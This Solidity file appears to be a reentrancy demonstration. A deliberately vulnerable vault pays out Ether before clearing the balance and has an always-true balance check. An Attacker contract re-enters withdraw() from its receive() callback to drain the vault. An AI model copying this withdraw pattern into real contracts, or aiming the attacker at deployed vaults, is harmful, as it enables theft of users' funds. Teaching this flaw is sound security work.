// SPDX-License-Identifier: MIT
pragma solidity ^0.8;
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
contract VulnerableVault {

    mapping (address => uint) public balances;

    //增加余额
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    //转出余额
    function withdraw() external{
        require (balances[msg.sender] >=0,"NO blance");  //如果余额不足，则会抛出错误

        (bool success,)=msg.sender.call{value:balances[msg.sender]}("");

        require(success,"Failed to send Ether");

         balances[msg.sender]=0;

    }

}


contract Attacker is ReentrancyGuard  {
      VulnerableVault public target;

      constructor (address ads){
        target=VulnerableVault(ads);
      }

      // 回调函数，趁机再次提取
    receive() external payable {
        if (address(target).balance > 1 ether) {
            target.withdraw();
        }
    }

    fallback() external payable { }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need 1 ETH");
        target.deposit{value:  1 ether}();
        target.withdraw();
    }


}


